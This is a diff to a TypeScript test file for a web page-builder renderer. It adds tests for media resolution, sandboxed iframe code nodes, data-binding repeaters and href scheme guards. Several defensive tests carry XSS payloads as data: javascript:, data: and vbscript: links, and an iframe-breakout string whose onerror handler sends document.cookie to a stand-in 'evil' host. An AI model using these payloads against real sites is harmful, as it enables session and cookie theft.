@@ -24,11 +24,11 @@ function renderRich(input: string): string {
  * regress the published render. Deterministic — no browser.
  */
 
-function render(nodes: BuilderNode[], components?: Record<string, BuilderNode>): string {
+function render(nodes: BuilderNode[], options: Parameters<typeof renderBuilderNodes>[1] = {}): string {
   return renderToStaticMarkup(
     renderBuilderNodes(nodes, {
       mode: "freeform",
-      ...(components ? { components } : {}),
+      ...options,
     }) as Parameters<typeof renderToStaticMarkup>[0],
   );
 }
@@ -177,6 +177,68 @@ test("transitions: hover auto-default emits easing without a shorthand", () => {
   assert.ok(html.includes("--bn-transition-property:all"), "default property");
   assert.ok(html.includes("--bn-transition-duration:.2s"), "default duration");
   assert.ok(!html.includes("transition:all .2s ease"), "no inline shorthand");
+});
+
+test("image mediaId resolves to the tenant media asset public URL", () => {
+  const html = renderToStaticMarkup(
+    renderBuilderNodes(
+      [
+        {
+          id: "img1",
+          kind: "image",
+          props: {
+            mediaId: "11111111-1111-4111-8111-111111111111",
+            src: "https://example.com/fallback.jpg",
+            alt: "",
+          },
+        },
+      ],
+      {
+        mode: "freeform",
+        dataSources: {
+          mediaAssets: [
+            {
+              id: "11111111-1111-4111-8111-111111111111",
+              publicUrl: "https://pluhdapdnuiulvxmyspd.supabase.co/storage/v1/object/public/media-public/tenant/a/library/photo.webp",
+              alt: "Library portrait",
+              width: 1200,
+              height: 1600,
+            },
+          ],
+        },
+      },
+    ) as Parameters<typeof renderToStaticMarkup>[0],
+  );
+
+  assert.ok(html.includes("photo.webp"), "resolved public URL");
+  assert.ok(html.includes('alt="Library portrait"'), "asset alt fallback");
+  assert.ok(
+    html.includes('data-builder-media-id="11111111-1111-4111-8111-111111111111"'),
+    "media id marker",
+  );
+  assert.ok(!html.includes("fallback.jpg"), "raw fallback should not win");
+});
+
+test("image mediaId falls back without rendering unsafe raw src", () => {
+  const html = renderToStaticMarkup(
+    renderBuilderNodes(
+      [
+        {
+          id: "img1",
+          kind: "image",
+          props: {
+            mediaId: "22222222-2222-4222-8222-222222222222",
+            src: "javascript:alert(1)",
+            alt: "Unsafe",
+          },
+        },
+      ],
+      { mode: "freeform", dataSources: { mediaAssets: [] } },
+    ) as Parameters<typeof renderToStaticMarkup>[0],
+  );
+
+  assert.ok(!html.includes("<img"), "unsafe unresolved image is omitted");
+  assert.ok(!html.includes("javascript:"), "unsafe src is never rendered");
 });
 
 test("container queries: query containers and slot-width overrides emit", () => {
@@ -541,6 +603,72 @@ test("node kind: rich_text renders annotations and sanitizes unsafe links", () =
   assert.ok(html.includes("color:#111827"), "shared style");
 });
 
+test("node kind: code renders an opaque-origin sandboxed iframe (scripts-only)", () => {
+  const html = render([
+    {
+      id: "code-1",
+      kind: "code",
+      props: {
+        html: '<h2>Widget</h2><p>hello</p>',
+        minHeight: 200,
+        style: { borderRadius: "12px" },
+      },
+    } as BuilderNode,
+  ]);
+
+  assert.ok(html.includes('data-builder-node-kind="code"'), "kind marker");
+  // The ONLY sandbox token granted is allow-scripts — pairing it with
+  // allow-same-origin (or top-nav / popups / forms) would let framed content
+  // escape the box, so those must never appear.
+  assert.ok(html.includes('sandbox="allow-scripts"'), "scripts-only sandbox");
+  assert.ok(!html.includes("allow-same-origin"), "no allow-same-origin");
+  assert.ok(!html.includes("allow-top-navigation"), "no top-navigation");
+  assert.ok(!html.includes("allow-popups"), "no popups");
+  assert.ok(!html.includes("allow-forms"), "no forms");
+  assert.ok(!html.includes("allow-presentation"), "no presentation");
+  // Author markup is delivered via the srcdoc attribute, never inlined.
+  // (renderToStaticMarkup preserves the JSX prop casing `srcDoc`/`referrerPolicy`;
+  // the browser lowercases them — either way it is the iframe srcdoc attribute.)
+  assert.ok(html.includes("srcDoc="), "author HTML carried in srcdoc");
+  assert.ok(html.includes('referrerPolicy="no-referrer"'), "no referrer leak");
+  assert.ok(html.includes("min-height:200px"), "min-height floor applied");
+  assert.ok(html.includes("border-radius:12px"), "shared style applied");
+});
+
+test("security: code node lets NO author script run in the parent origin", () => {
+  // Worst case: author tries to break out of the srcdoc attribute, inject a
+  // parent-level <script>, and steal the parent-scoped .tulala.digital cookie.
+  const payload =
+    '<script>document.title=document.cookie</script>' +
+    '"></iframe><script>window.__PWNED__=1</script>' +
+    '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';
+  const html = render([
+    { id: "code-evil", kind: "code", props: { html: payload } } as BuilderNode,
+  ]);
+
+  // 1) Exactly one iframe — the breakout `</iframe><script>` did NOT terminate
+  //    our element and spill author nodes into the parent document.
+  assert.equal((html.match(/<iframe/g) ?? []).length, 1, "single iframe, no breakout");
+  // 2) No live script tag anywhere at parent level. React entity-encodes the
+  //    whole srcdoc value, so every author `<` becomes `&lt;` — there is no
+  //    parseable <script> in the parent document, only inert attribute text.
+  assert.ok(!/<script/i.test(html), "no parent-level <script>");
+  assert.ok(!html.includes('onerror="'), "no live onerror handler at parent level");
+  // 3) The author's attribute-closing quote was neutralized: the whole
+  //    `"></iframe>` breakout attempt is entity-encoded inside the srcdoc value,
+  //    so it could not terminate the attribute or our element early.
+  assert.ok(
+    html.includes("&quot;&gt;&lt;/iframe&gt;"),
+    "breakout attempt entity-encoded inside srcdoc",
+  );
+  assert.ok(html.includes("&quot;"), "author quotes entity-encoded");
+  // 4) The payload survives — but only inside the srcdoc attribute, entity-
+  //    encoded — proving it is data, parsed by the sandboxed frame, not the host.
+  assert.ok(html.includes("&lt;script&gt;"), "author script preserved as inert text");
+  assert.ok(html.includes('sandbox="allow-scripts"'), "still scripts-only sandbox");
+  assert.ok(!html.includes("allow-same-origin"), "still no same-origin");
+});
+
 test("a11y: non-decorative icon without a label falls back to an accessible name", () => {
   const html = render([
     {
@@ -552,6 +680,182 @@ test("a11y: non-decorative icon without a label falls back to an accessible name
   assert.ok(html.includes('role="img"'), "semantic icon");
   // role=img must never be nameless (WCAG 4.1.2) — fall back to the icon name.
   assert.ok(html.includes('aria-label="check"'), "accessible-name fallback");
+});
+
+// ── Data-binding repeaters + field bindings ─────────────────────────────────
+
+function repeatCard(maxItems = 3): BuilderNode {
+  return {
+    id: "repeat",
+    kind: "container",
+    props: {
+      layout: "grid",
+      dataBinding: {
+        sourceKey: "featured_talent_profiles",
+        mode: "bound",
+        repeat: true,
+        maxItems,
+      },
+    },
+    children: [
+      {
+        id: "card",
+        kind: "card",
+        props: {},
+        children: [
+          {
+            id: "name",
+            kind: "heading",
+            props: {
+              text: "Fallback name",
+              level: 3,
+              fieldBindings: { text: "displayName" },
+            },
+          },
+          {
+            id: "cta",
+            kind: "button",
+            props: {
+              label: "Fallback CTA",
+              href: "/fallback",
+              fieldBindings: { label: "displayName", href: "href" },
+            },
+          },
+          {
+            id: "photo",
+            kind: "image",
+            props: {
+              src: "https://cdn.example.com/fallback.jpg",
+              alt: "Fallback alt",
+              fieldBindings: { src: "imageUrl", alt: "displayName" },
+            },
+          },
+        ],
+      },
+    ],
+  } as BuilderNode;
+}
+
+test("repeaters: container template emits one clone per collection item", () => {
+  const html = render([repeatCard()], {
+    dataSources: {
+      collections: {
+        featured_talent_profiles: [
+          { id: "talent-1", displayName: "Ana", href: "/t/ana", imageUrl: "/assets/ana.jpg" },
+          { id: "talent-2", displayName: "Bea", href: "/t/bea", imageUrl: "/assets/bea.jpg" },
+          { id: "talent-3", displayName: "Cleo", href: "/t/cleo", imageUrl: "/assets/cleo.jpg" },
+        ],
+      },
+    },
+  });
+
+  assert.equal((html.match(/data-builder-node-kind="card"/g) ?? []).length, 3);
+  assert.ok(html.includes("repeat__repeat_talent-1-1__card"), "stable item namespace");
+  assert.ok(html.includes(">Ana<") && html.includes(">Bea<") && html.includes(">Cleo<"));
+  assert.ok(html.includes('href="/t/ana"'), "bound href kept after allowlist");
+  assert.ok(html.includes('src="/assets/ana.jpg"'), "bound image src kept after validation");
+  assert.ok(!html.includes("Fallback name"), "field binding replaces design text");
+});
+
+test("repeaters: maxItems limits resolved collection output", () => {
+  const html = render([repeatCard(1)], {
+    dataSources: {
+      collections: {
+        featured_talent_profiles: [
+          { id: "talent-1", displayName: "Ana" },
+          { id: "talent-2", displayName: "Bea" },
+        ],
+      },
+    },
+  });
+
+  assert.ok(html.includes(">Ana<"));
+  assert.ok(!html.includes(">Bea<"));
+});
+
+test("repeaters: empty source renders the template once as static fallback", () => {
+  const html = render([repeatCard()], {
+    dataSources: { collections: { featured_talent_profiles: [] } },
+  });
+
+  assert.equal((html.match(/data-builder-node-kind="card"/g) ?? []).length, 1);
+  assert.ok(html.includes("Fallback name"), "template remains visible");
+});
+
+test("repeaters: bound javascript href is dropped", () => {
+  const html = render([repeatCard()], {
+    dataSources: {
+      collections: {
+        featured_talent_profiles: [
+          {
+            id: "talent-1",
+            displayName: "Unsafe",
+            href: "javascript:alert(1)",
+            imageUrl: "/assets/safe.jpg",
+          },
+        ],
+      },
+    },
+  });
+
+  assert.ok(html.includes(">Unsafe<"), "bound label still renders as text");
+  assert.ok(!html.includes("javascript:alert"), "unsafe href never reaches markup");
+  assert.ok(!html.includes('href="javascript'), "link target dropped");
+});
+
+test("repeaters: bound image src is validated before rendering", () => {
+  const html = render([repeatCard()], {
+    dataSources: {
+      collections: {
+        featured_talent_profiles: [
+          { id: "talent-1", displayName: "Bad image", imageUrl: "data:image/svg+xml,<svg/>" },
+        ],
+      },
+    },
+  });
+
+  assert.ok(html.includes("Bad image"));
+  assert.ok(!html.includes("data:image"), "unsafe image src never reaches markup");
+});
+
+test("repeaters: nested repeaters render once per outer item, not cartesian", () => {
+  const node = repeatCard() as Extract<BuilderNode, { kind: "container" }>;
+  const template = node.children[0] as BuilderNode & { children: BuilderNode[] };
+  template.children = [
+    {
+      id: "nested",
+      kind: "container",
+      props: {
+        layout: "stack",
+        dataBinding: {
+          sourceKey: "featured_talent_profiles",
+          mode: "bound",
+          repeat: true,
+          maxItems: 10,
+        },
+      },
+      children: [
+        {
+          id: "nested-name",
+          kind: "heading",
+          props: { text: "Nested {{displayName}}", level: 4 },
+        },
+      ],
+    },
+  ];
+  const html = render([node], {
+    dataSources: {
+      collections: {
+        featured_talent_profiles: [
+          { id: "talent-1", displayName: "Ana" },
+          { id: "talent-2", displayName: "Bea" },
+        ],
+      },
+    },
+  });
+
+  assert.equal((html.match(/Nested /g) ?? []).length, 2);
+  assert.ok(html.includes("Nested Ana") && html.includes("Nested Bea"));
 });
 
 // ── Living Components Phase 3 ─────────────────────────────────────────────────
@@ -575,7 +879,7 @@ function instance(id: string, overrides?: Record<string, unknown>): BuilderNode 
 test("phase3: instance resolves master LIVE + per-instance override + namespaced ids", () => {
   const html = render(
     [instance("instA"), instance("instB", { "m-h": { text: "OVERRIDDEN" } })],
-    { "cmp-1": MASTER },
+    { components: { "cmp-1": MASTER } },
   );
   assert.ok(html.includes("MASTER HEADING"), "instA shows master heading live");
   assert.ok(html.includes("OVERRIDDEN"), "instB heading overridden");
@@ -586,7 +890,7 @@ test("phase3: instance resolves master LIVE + per-instance override + namespaced
 
 test("phase3: missing component + no-components both fall back to stored children (never blank)", () => {
   // component map present but missing this id
-  const missing = render([instance("instC")], { "other-cmp": MASTER });
+  const missing = render([instance("instC")], { components: { "other-cmp": MASTER } });
   assert.ok(missing.includes("FALLBACK") && !missing.includes("MASTER HEADING"), "missing component → stored fallback");
   // no components passed at all
   const none = render([instance("instD")]);
@@ -621,4 +925,41 @@ test("security: renderInlineRich neutralizes javascript:/data:/vbscript: links t
   }
   // the link label survives as readable text
   assert.ok(renderRich("[click](javascript:alert(1))").includes("click"), "label kept as text");
+});
+
+// ── SECURITY: structured href fields (button/CTA) render-time scheme guard ─────
+// Sibling of the rich-text guard above, for STRUCTURED href fields (button
+// `href`, pricing `ctaHref`, section `ctaHref`/`rsvpUrl`/`brandHref`). These are
+// guarded at publish time, but admin Duplicate / JSON import / legacy data /
+// direct DB writes bypass preflight. prefixPublicHref now neutralizes
+// dangerous-scheme hrefs at render so the published <a> can never be a
+// clickable XSS. `render()` here uses an empty publicPathPrefix → the apex
+// surface, the exact attack target.
+
+function buttonNode(href: string): BuilderNode {
+  return { id: "b1", kind: "button", props: { href, label: "Go" } } as BuilderNode;
+}
+
+test("security: button node renders dangerous-scheme href as # on the apex surface", () => {
+  for (const href of [
+    "javascript:alert(1)",
+    "JavaScript:alert(document.cookie)",
+    "data:text/html,<script>alert(1)</script>",
+    "vbscript:msgbox(1)",
+  ]) {
+    const html = render([buttonNode(href)]);
+    assert.ok(html.includes('href="#"'), `neutralized to # for ${href}`);
+    assert.ok(!html.toLowerCase().includes("javascript:"), `no javascript: href for ${href}`);
+    assert.ok(!html.toLowerCase().includes("vbscript:"), `no vbscript: href for ${href}`);
+    assert.ok(!html.toLowerCase().includes("data:text"), `no data: href for ${href}`);
+    assert.ok(html.includes(">Go<"), `label preserved for ${href}`);
+  }
+});
+
+test("security: button node preserves legitimate mailto/tel/https/relative hrefs", () => {
+  assert.ok(render([buttonNode("mailto:hi@example.com")]).includes('href="mailto:hi@example.com"'));
+  assert.ok(render([buttonNode("tel:+15551234567")]).includes('href="tel:+15551234567"'));
+  assert.ok(render([buttonNode("https://example.com")]).includes('href="https://example.com"'));
+  assert.ok(render([buttonNode("/directory")]).includes('href="/directory"'));
+  assert.ok(render([buttonNode("#section")]).includes('href="#section"'));
 });
